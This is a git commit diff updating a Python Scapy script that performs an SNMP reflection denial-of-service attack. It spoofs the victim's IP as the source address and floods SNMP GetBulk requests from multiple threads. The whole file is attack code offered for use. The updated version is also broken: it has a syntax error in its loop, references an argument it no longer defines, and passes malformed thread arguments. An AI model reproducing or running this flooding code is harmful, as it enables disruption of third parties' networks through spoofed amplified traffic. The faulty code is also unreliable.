0f7c03c429fcdcf161ef7e2f5b448dcc6e7e5a3f
AndresBena19 <andres_felipe16@hotmail.es>
2017-07-25 19:55:24 -0500

    Update Dos_snmp.py

--- Denial service/Dos_snmp.py
+++ Denial service/Dos_snmp.py
@@ -1,32 +1,33 @@
-#!/usr/bin/python
-
-
 
 from scapy.all import *
+from time import sleep
 
 import logging
 import argparse
 import sys
+import thread
+import random
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-parser = argparse.ArgumentParser(description="Script para hacer ataque Dos por SNMP")
-
-parser.add_argument('-P', '--IP_USER', help="IP de la victima", required=True, dest='USER')
-parser.add_argument('-D', '--IP_SNMP', help="IP de maquina que retornara la consulta", required=True, dest='DEST')
-parser.add_argument('-n', '--ITERATIONS', help="Numero de paquetes", required=True,dest='NUMBER')
+parser = argparse.ArgumentParser(description="Script para hacer Dos con SNMP")
+parser.add_argument('-V', '--IP_USER',metavar="IPUSER", help="IP de la victima", required=True, dest='USER')
+parser.add_argument('-C', '--CONECTIONS',metavar="NUMCONECT", help="Numero de conexiones", required=True, dest='CONECT')
+parser.add_argument('-t', '--threads', metavar="THreads", help="Numero de hilos", required=True,dest='TH')
 
 args = parser.parse_args()
 
 
-bulk = SNMPbulk(max_repetitions = 50, varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.2.1.1')), SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))])
-
-snmp = SNMP(PDU=bulk)
-
-print 'Iniciando Dos a IP' + args.USER
-
-request = sr1(IP(src=args.USER, dst=args.DEST)/UDP(dport=161,sport=161)/snmp, count=args.NUMBER)
-
+def floodsnmp(target):
+ for p range (int(args.CONECT)):
+   bulk = SNMPbulk(max_repetitions = 50, varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.2.1.1')), SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))])
+   snmp = SNMP(PDU=bulk)
+   print 'Iniciando Dos a IP' + args.USER
+   request = sr1(IP(src=args.USER, dst=args.DEST)/UDP(dport=161,sport=161)/snmp)
 
 
+
+if __name__ == "__main__":
+ for x in range(0,args.TH):
+  thread.start_new_thread(floodsnmp, (args.USER))
 
